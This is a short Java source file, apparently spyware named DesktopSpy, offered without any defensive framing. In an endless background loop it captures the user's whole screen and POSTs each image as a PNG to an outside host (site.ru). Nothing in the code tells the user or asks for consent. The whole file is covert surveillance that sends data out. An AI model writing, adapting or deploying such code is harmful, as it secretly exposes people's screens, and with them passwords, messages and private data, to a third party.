package desktopSpy;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

final class DesktopSpy implements Runnable {
    private Thread thread;

    private DesktopSpy() {
        this.thread = new Thread(this);
        this.thread.start();
    }

    @Override
    public void run() {
        try {
            Robot robot = new Robot();
            Rectangle bounds = new Rectangle(
                GraphicsEnvironment
                .getLocalGraphicsEnvironment()
                .getMaximumWindowBounds()
            );

            while (thread.isAlive()) {
                URL url = new URL("https://site.ru/");
                HttpURLConnection http = (HttpURLConnection) url.openConnection();
                http.setRequestMethod("POST");
                http.setRequestProperty("Content-Type", "image/png;");
                http.setDoOutput(true);
                http.setDoInput(true);
                http.connect();

                BufferedImage image = robot.createScreenCapture(bounds);

                OutputStream os = http.getOutputStream();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();

                ImageIO.write(image, "png", baos);
                byte[] bytes = baos.toByteArray();

                os.write(bytes);

                InputStreamReader isr = new InputStreamReader(http.getInputStream());
                BufferedReader br = new BufferedReader(isr);
                StringBuilder response = new StringBuilder();
            }

        } catch (Exception e) {
            System.out.println(e);
            System.exit(34);
        }
    }

    public static void main(String[] args) {
        new DesktopSpy();
    }
}
